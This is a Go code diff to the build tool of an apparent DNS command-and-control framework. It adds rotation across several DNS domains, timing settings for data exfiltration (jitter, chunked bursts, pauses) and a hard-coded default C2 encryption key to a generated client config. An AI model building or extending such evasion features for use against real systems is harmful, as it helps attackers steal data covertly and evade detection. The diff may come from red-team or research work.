@@ -33,15 +33,21 @@ type BuildConfig struct {
 		Debug         bool   `json:"debug"`
 	} `json:"server"`
 	Client struct {
-		ServerDomain     string `json:"server_domain"`
-		DNSServer        string `json:"dns_server"`
-		QueryType        string `json:"query_type"`
-		Encoding         string `json:"encoding"`
-		Timeout          int    `json:"timeout"`
-		MaxCommandLength int    `json:"max_command_length"`
-		RetryAttempts    int    `json:"retry_attempts"`
-		SleepMin         int    `json:"sleep_min"`
-		SleepMax         int    `json:"sleep_max"`
+		ServerDomain        string   `json:"server_domain"`
+		DNSDomains          []string `json:"dns_domains"`
+		DomainSelectionMode string   `json:"domain_selection_mode"`
+		DNSServer           string   `json:"dns_server"`
+		QueryType           string   `json:"query_type"`
+		Encoding            string   `json:"encoding"`
+		Timeout             int      `json:"timeout"`
+		MaxCommandLength    int      `json:"max_command_length"`
+		RetryAttempts       int      `json:"retry_attempts"`
+		SleepMin            int      `json:"sleep_min"`
+		SleepMax            int      `json:"sleep_max"`
+		ExfilJitterMinMs    int      `json:"exfil_jitter_min_ms"`
+		ExfilJitterMaxMs    int      `json:"exfil_jitter_max_ms"`
+		ExfilChunksPerBurst int      `json:"exfil_chunks_per_burst"`
+		ExfilBurstPauseMs   int      `json:"exfil_burst_pause_ms"`
 	} `json:"client"`
 	Stager struct {
 		JitterMinMs       int `json:"jitter_min_ms"`
@@ -307,6 +313,94 @@ func tryLoadEmbeddedConfig() (Config, bool) {
 func generateClientConfig(config *BuildConfig) error {
 	fmt.Println("Generating client configuration...")
 
+	// Normalize DNS domain list and selection mode
+	dnsDomains := make([]string, 0, len(config.Client.DNSDomains))
+	for _, domain := range config.Client.DNSDomains {
+		domain = strings.TrimSpace(domain)
+		if domain != "" {
+			dnsDomains = append(dnsDomains, domain)
+		}
+	}
+	if len(dnsDomains) == 0 && config.Client.ServerDomain != "" {
+		dnsDomains = append(dnsDomains, config.Client.ServerDomain)
+	}
+
+	serverDomain := config.Client.ServerDomain
+	if serverDomain == "" && len(dnsDomains) > 0 {
+		serverDomain = dnsDomains[0]
+	}
+
+	dnsDomainsLiteral := "[]string{}"
+	if len(dnsDomains) > 0 {
+		parts := make([]string, len(dnsDomains))
+		for i, domain := range dnsDomains {
+			parts[i] = fmt.Sprintf(`"%s"`, domain)
+		}
+		dnsDomainsLiteral = fmt.Sprintf("[]string{%s}", strings.Join(parts, ", "))
+	}
+
+	selectionMode := config.Client.DomainSelectionMode
+	if selectionMode == "" {
+		selectionMode = "random"
+	}
+
+	exfilJitterMin := config.Client.ExfilJitterMinMs
+	if exfilJitterMin <= 0 {
+		exfilJitterMin = 10000
+	}
+	exfilJitterMax := config.Client.ExfilJitterMaxMs
+	if exfilJitterMax <= 0 {
+		exfilJitterMax = 30000
+	}
+	if exfilJitterMax < exfilJitterMin {
+		exfilJitterMax = exfilJitterMin
+	}
+	exfilChunksPerBurst := config.Client.ExfilChunksPerBurst
+	if exfilChunksPerBurst <= 0 {
+		exfilChunksPerBurst = 5
+	}
+	exfilBurstPause := config.Client.ExfilBurstPauseMs
+	if exfilBurstPause <= 0 {
+		exfilBurstPause = 120000
+	}
+
+	timeout := config.Client.Timeout
+	if timeout <= 0 {
+		timeout = 10
+	}
+	maxCommandLength := config.Client.MaxCommandLength
+	if maxCommandLength <= 0 {
+		maxCommandLength = 400
+	}
+	retryAttempts := config.Client.RetryAttempts
+	if retryAttempts <= 0 {
+		retryAttempts = 3
+	}
+	sleepMin := config.Client.SleepMin
+	if sleepMin <= 0 {
+		sleepMin = 60
+	}
+	sleepMax := config.Client.SleepMax
+	if sleepMax <= 0 {
+		sleepMax = 120
+	}
+	if sleepMax < sleepMin {
+		sleepMax = sleepMin
+	}
+
+	queryType := config.Client.QueryType
+	if queryType == "" {
+		queryType = "TXT"
+	}
+	encoding := config.Client.Encoding
+	if encoding == "" {
+		encoding = "aes-gcm-base36"
+	}
+	encryptionKey := config.Security.EncryptionKey
+	if encryptionKey == "" {
+		encryptionKey = "MySecretC2Key123!@#DefaultChange"
+	}
+
 	clientConfig := fmt.Sprintf(`package main
 
 // This file is auto-generated at build time
@@ -314,16 +408,22 @@ func generateClientConfig(config *BuildConfig) error {
 
 // embeddedConfig contains the configuration embedded at build time
 var embeddedConfig = Config{
-	ServerDomain:     %q,
-	DNSServer:        %q,
-	QueryType:        %q,
-	Encoding:         %q,
-	EncryptionKey:    %q,
-	Timeout:          %d,
-	MaxCommandLength: %d,
-	RetryAttempts:    %d,
-	SleepMin:         %d,
-	SleepMax:         %d,
+	ServerDomain:        %q,
+	DNSDomains:          %s,
+	DomainSelectionMode: %q,
+	DNSServer:           %q,
+	QueryType:           %q,
+	Encoding:            %q,
+	EncryptionKey:       %q,
+	Timeout:             %d,
+	MaxCommandLength:    %d,
+	RetryAttempts:       %d,
+	SleepMin:            %d,
+	SleepMax:            %d,
+	ExfilJitterMinMs:    %d,
+	ExfilJitterMaxMs:    %d,
+	ExfilChunksPerBurst: %d,
+	ExfilBurstPauseMs:   %d,
 }
 
 // getConfig returns the embedded configuration
@@ -331,16 +431,22 @@ func getConfig() Config {
 	return embeddedConfig
 }
 `,
-		config.Client.ServerDomain,
+		serverDomain,
+		dnsDomainsLiteral,
+		selectionMode,
 		config.Client.DNSServer,
-		config.Client.QueryType,
-		config.Client.Encoding,
-		config.Security.EncryptionKey,
-		config.Client.Timeout,
-		config.Client.MaxCommandLength,
-		config.Client.RetryAttempts,
-		config.Client.SleepMin,
-		config.Client.SleepMax,
+		queryType,
+		encoding,
+		encryptionKey,
+		timeout,
+		maxCommandLength,
+		retryAttempts,
+		sleepMin,
+		sleepMax,
+		exfilJitterMin,
+		exfilJitterMax,
+		exfilChunksPerBurst,
+		exfilBurstPause,
 	)
 
 	return os.WriteFile("Client/config.go", []byte(clientConfig), 0644)
